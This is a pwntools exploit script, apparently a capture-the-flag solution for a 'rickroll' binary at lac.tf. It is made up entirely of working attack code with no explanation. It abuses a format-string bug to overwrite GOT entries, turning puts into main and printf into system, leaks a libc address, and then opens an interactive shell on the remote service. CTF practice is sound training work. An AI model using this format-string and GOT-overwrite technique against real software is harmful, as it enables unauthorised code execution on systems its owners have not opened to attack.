from pwn import *

exe = ELF("rickroll_patched")
# exe_rop = ROP(exe)
libc = ELF("libc-2.31.so")
# libc = ELF("/usr/lib/x86_64-linux-gnu/libc.so.6")
# ld = ELF("./ld-2.27.so")

context.binary = exe
# context.log_level = 'DEBUG'

def wait(*msg):
    if args.LOCAL and args.R2:
        input(" ".join(map(str,msg)))
    else:
        time.sleep(0.2)

def log_print(*msg):
    log.info(" ".join(map(str,msg)))
lp = log_print
def start():
    if args.LOCAL:
        r = process([exe.path])
        if args.R2:
            util.proc.wait_for_debugger(util.proc.pidof(r)[0])
    else:
        r = remote("lac.tf", 31135)
    return r


io = start()
# pop_rdi_ret_addr = exe_rop.find_gadget(['pop rdi', 'ret'])[0]
# print("pop rdi ret ",hex(pop_rdi_ret_addr))
lp(hex(libc.sym["printf"]))
lp(hex(libc.sym["fgets"]))

payload = b"%15$sAAA"+fmtstr_payload(6+1, {
    0x0040406c:b'\x00\x00',
    exe.got["puts"]:exe.sym["main"],
}, numbwritten=8+3-2, write_size='short')+p64(exe.got["printf"])
io.sendlineafter(b"Lyrics:",payload)
io.recvuntil(b"run around and ")
libc.address = int.from_bytes(io.recvuntil(b"AAA",drop=True),"little")-libc.sym["printf"]
lp("libc",hex(libc.address))
io.sendlineafter(b"Lyrics:",fmtstr_payload(6, {
    0x0040406c:b'\x00\x00',
    exe.got["printf"]:libc.sym["system"],
}, numbwritten=0, write_size='short'))
# io.sendlineafter(b"Lyrics:",fmtstr_payload(6, {
#     0x0040406c:b'\x00\x00',
#     exe.got["fgets"]:libc.sym["gets"],
# }, numbwritten=0, write_size='short'))
# lp("gets",hex(libc.sym["gets"]))
# io.recvuntil(b"Lyrics:")
io.interactive()